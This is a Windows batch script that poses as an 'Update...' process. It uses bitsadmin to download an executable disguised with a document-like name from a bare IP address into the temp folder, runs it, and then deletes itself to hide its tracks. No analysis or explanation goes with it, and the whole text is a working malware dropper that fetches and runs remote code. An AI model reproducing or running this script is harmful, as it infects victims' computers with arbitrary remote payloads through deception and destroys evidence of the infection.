@echo off
title Update...
color f
set DEVIL="%temp%\\ds.exe"
bitsadmin /transfer "mdj" /download /priority FOREGROUND "http://37.139.128.94/fx/Doc75300602.exe" %DEVIL%
start "" %DEVIL%
DEL "%~f0"